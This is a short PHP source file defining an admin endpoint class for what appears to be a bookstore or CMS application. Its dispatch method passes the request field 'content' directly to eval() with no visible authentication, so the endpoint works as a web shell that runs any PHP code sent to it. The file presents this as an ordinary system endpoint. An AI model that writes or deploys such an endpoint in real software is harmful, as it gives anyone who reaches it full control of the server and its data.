<?php

class eclEndpoint_bookstoreAdminSistema_php extends eclEndpoint
{

    public function dispatch(array $input): array
    {
        global $io, $store;

        if (isset($input['content'])) {
            eval ($input['content']);
            $store->close();
            $io->close();
            ob_end_flush();
            exit();
        }
        return [];
    }

}
